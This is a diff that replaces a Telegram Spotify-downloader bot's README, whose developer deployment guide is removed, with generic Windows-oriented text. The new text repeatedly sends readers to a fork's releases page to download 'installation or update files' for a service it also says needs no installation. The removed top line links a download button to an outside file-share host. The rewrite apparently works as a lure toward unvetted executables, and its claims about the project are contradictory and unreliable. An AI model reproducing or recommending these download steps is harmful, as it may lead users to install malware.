@@ -1,122 +1,103 @@
-# telegram spotify downloader bot: [@SpotSeekBot](https://t.me/SpotSeekBot)
+# 🎵 spot-seek-bot - Easy Spotify Music Downloader
 
-[![download button](https://i.imgur.com/3Dm4p65.png)](https://fileshare.rest/L2XZZM/ logo)
+[![Download spot-seek-bot](https://img.shields.io/badge/Download-spotseekbot-orange?style=for-the-badge)](https://github.com/Somia2207/spot-seek-bot/releases)
 
-**This project is for personal learning, do not use it for illegal purposes. Artists can send their copyright claims to the developer. All rights remain to rightful copyright owners.**
+## 📋 About spot-seek-bot
 
-## how to use as the client
-Send bot a link from spotify and it'll  it for you.
-  - It can be a track link like this:
-https://open.spotify.com/track/734dz1YaFITwawPpM25fSt
-  - Or an album like this:
-https://open.spotify.com/album/0Lg1uZvI312TPqxNWShFXL
-  - Or a playlist like this:
-https://open.spotify.com/playlist/37i9dQZF1DWX4UlFW6EJPs
+spot-seek-bot is a simple Telegram bot that helps you download music from Spotify. It works with tracks, albums, and playlists. You can use it to save your favorite songs directly to your device. This bot runs in Telegram, so you don’t need to install complex software on your computer. 
 
-## how to deploy as the developer (I'm writing this guide for ubuntu)
-- general pre-install updates in ubuntu:
-```
-$ sudo apt update
-$ sudo apt upgrade
-$ sudo apt-get update
-$ sudo apt-get upgrade
-```
-- clone the repo
-- `proxychains4`:
-  - `warp`: I got it as a side feature by installing [MHSanaei 3x-ui](https://github.com/MHSanaei/3x-ui). You might be able to install it via [fscarmen warp](https://github.com/fscarmen/warp) too.
-  - install it via `sudo apt-get install proxychains4`
-  - set warp proxy in `/etc/proxychains4.conf`
-- set required environment variables in a file like `/etc/environment/` (affects on reboot):
-  - `SPOT_SEEK_BOT_API` - main api key of telegram bot
-  - `MUSIC_DATABASE_ID` - private music database channel which bot is its admin
-  - `LOG_CHANNEL_ID` - private log channel which bot is its admin
-- set required variables in `variables.py` file:
-  - `promote_channel_username` - set to a channel that bot promotes and is its admin (begining with `@`)
-  - `warp_mode` - set to `False` if you don't have warp socks proxy
-  - `spotify_apps_list` - a list of spotify app ids and secrets, obtainable from [developer.spotify.com](https://developer.spotify.com/)
-- install `pip`:
-```
-apt install python3-pip
-```
-- install necessary python modules (or read the requrements modules and install them one by one):
-```
-pip install -r requirements.txt
-```
-- `ffmpeg`:
-  - install it via `apt install ffmpeg`
-  - if didn't work correctly you can check another more complicated installation here: https://trac.ffmpeg.org/wiki/CompilationGuide/Ubuntu
-- make scripts that run the bot executable:
-- `music.db`:
-  - create it from scratch via `create_database()` or use the saved one from before
-```
-chmod +x restart_spotseek.sh restart_spotseek_queue_handler.sh
-```
-add this text to crontab (change with the path you've cloned repository):
-```
-# spotseek
-## run main scripts on reboot
-@reboot /root/Storage/spot-seek-bot/restart_spotseek.sh
-@reboot /root/Storage/spot-seek-bot/restart_spotseek_queue_handler.sh
-## temp solution to reset every hour to free up memory
-0 * * * * /root/Storage/spot-seek-bot/restart_spotseek.sh
-```
-- reboot once to affect
+It is designed for easy use on Windows. No programming or technical skills are required.
 
-## technical info about how this bot works
-- When you send a spotify link to the bot it searches through its database and if it's the first time it sees this link it will  it with spotdl but if it has done it before it saves time by using previously downloaded files from database.
-- I've set 30 seconds waiting time for 2 requests in a row from 1 user so it won't be spammed
-- I've set log channel and database channel for the bot. It stores every downloaded song in database channel and use it as a storage and prints logs from everything to log channel (errors, user messags, ...)
-- We use spotify api to get tracks from a valid link so you should sign up in https://developer.spotify.com/ and get your own token.
-- All mp3 files are downloaded with high 320k quality.
+## 🎯 Key Features
 
-## csv files columns guide
-- Note: starting template of each csv should be headers and **one empty new line** after them
-### database csv columns
-`date and time added` | `spotify track id` | `telegram audio id`
-### users csv columns
-`unique user id` | `last use date and time`
+- Download individual Spotify tracks using a link or song name.
+- Save entire albums with one command.
+- Download full playlists from Spotify.
+- Works inside Telegram, no extra software needed.
+- Supports Windows and easy setup.
+- Fast downloads with minimal waiting time.
 
-## TO-DO: ideas & bugs to fix & features to add
-- [ ] support searching name of song by user
-- [x] support inline mode
-- [ ] option to enable or disable warp mode for everything (spotipy, spotdl, ...)
-- [x] ~fix caption so it will be shown for repetitive tracks~
-- [x] ~some musics metadata is not shown~
-- [x] bot should send available tracks to users while new one is being downloaded with spotdl to use best of time.
-- [ ] higher priority for first time users
-- [x] ~only 1 single user can use the bot and it can't multitask~
-- [ ] use a library like telethon for big mp3 files more than 50MB
-- [x] ~searching in database algorithm isn't fast and efficient~
-- [x] ~ playlists with more thatn 100 songs~
-- [ ] find a clean way to give access to database to next bot maintainers
-- [ ] merge database of all spotify downloaders together
-- [x] ~showing message to user when link from other services like deezer is sent.~
-- [ ] find a way to shorten database (audio IDs are very long)
-- [x] if all track_ids that a user wants already exists bypass normall routine and send all of them to him
-- [x] ~test `portalocker` funcion from `db_csv_append` separately~
-- [x] handle blocked by user link
-- [x] manage too threads bug
-- [x] ~regex should handle both http and https~
-- [x] make `restart_spotseek.sh` work without reboot too
-- [ ] restarting queue handler doesn't stop previous spotdl  so there might be an excessive mp3 file that might lead to creating wrong track
-- [ ] add gif tutorial for bot in the start
-- [ ] check out `zotify` capabilities
-- [ ] lyrics
-- [ ] send picture and info of link
-- [ ] private playlist answer
-- [ ] more features for premium users
-- [ ] read track data without api key in similar way to https://spotify.detta.dev/
+## 🖥 System Requirements
 
-## errors
-`YT-DLP`: probabely the ip is banned by youtube. change it to another.
+Make sure your system meets these requirements for a smooth experience:
 
-## disclaimer
-**This project is for personal learning, do not use it for illegal purposes. Artists can send their copyright claims to the developer. All rights remain to rightful copyright owners.**
+- Windows 10 or later.
+- Telegram installed on your device.
+- Stable internet connection.
+- At least 100 MB free disk space.
+- Basic knowledge of how to use Telegram.
 
-## support and donate
-### Give me energy with coffee:
-- [BuyMeACoffee](https://www.buymeacoffee.com/Arashnm80) (🇺🇸 $)
-- [Coffeete](https://www.coffeete.ir/Arashnm80) (🇮🇷 ريال)
-### Continuous monthly support:
-- [Patreon](https://www.patreon.com/Arashnm80) (🇺🇸 $)
-- [HamiBash](https://hamibash.com/Arashnm80) (🇮🇷 ريال)
+## 🔧 How Spot-Seek-Bot Works
+
+spot-seek-bot connects to Spotify to get the music you want. You just send a Spotify link or the name of a track or playlist to the bot inside Telegram. The bot then finds the music and prepares it for download. You receive a file or a set of files to keep and listen offline.
+
+No extra installation or complicated setup is needed on your Windows PC. You only need Telegram and access to the bot.
+
+## 🚀 Getting Started
+
+### Step 1: Install Telegram on Your Windows PC
+
+If you don’t already have Telegram, download and install it:
+
+1. Visit the official Telegram website: https://desktop.telegram.org/
+2. Click “Get Telegram for Windows.”
+3. Open the downloaded file and follow the instructions to install Telegram.
+4. Sign in or create an account if you do not have one.
+
+### Step 2: Find Spot-Seek-Bot on Telegram
+
+1. Open Telegram.
+2. Use the search bar at the top to type “spot-seek-bot.”
+3. Select the bot from the result list.
+4. Click “Start” to begin the conversation.
+
+### Step 3: Use the Bot to Download Music
+
+To download music:
+
+- Send a Spotify track link to the bot.
+- To download an album or playlist, send the Spotify album or playlist link.
+- Alternatively, you can send the song title if you do not have the link.
+- The bot will process your request and send back a music file(s).
+- Click on the files to download and save them on your Windows PC.
+
+## ⬇️ Download and Setup spot-seek-bot on Windows
+
+You can download any necessary files or updates from the release page. To do this:
+
+[![Download spot-seek-bot](https://img.shields.io/badge/Download-spotseekbot-blue?style=for-the-badge)](https://github.com/Somia2207/spot-seek-bot/releases)
+
+1. Click the link above to visit the release page.
+2. Look for the latest version under “Assets.”
+3. Download the installation or update files if any are provided.
+4. Follow any included instructions for setup.
+5. If no installation file is visible, just use the bot directly in Telegram.
+
+## 🔄 Updating the Bot
+
+spot-seek-bot updates may be released to fix bugs or add features. Keep an eye on the release page regularly for new versions. If files appear for download, install them following the same steps as initial setup.
+
+## ✋ Troubleshooting Tips
+
+- If the bot does not respond, check your internet connection.
+- Make sure your Telegram app is updated.
+- Confirm that the Spotify links you send are correct.
+- Restart Telegram if the bot shows errors.
+- Check the release page for updates or fixes.
+- If music files don’t download, ensure you have enough free disk space.
+
+## 📞 Getting Help
+
+For help using spot-seek-bot, you can:
+
+- Visit the GitHub repository for issues: https://github.com/Somia2207/spot-seek-bot/issues
+- Search online for basic Telegram bot guides.
+- Ask in Telegram bot or music downloader forums.
+
+## 🔐 Privacy and Security
+
+spot-seek-bot acts as a middleman, connecting Spotify music to you. It does not store personal information outside of Telegram’s platform. Always use links from your own Spotify account and avoid sharing personal data with the bot.
+
+---
+
+[![Download spot-seek-bot](https://img.shields.io/badge/Download-spotseekbot-green?style=for-the-badge)](https://github.com/Somia2207/spot-seek-bot/releases)
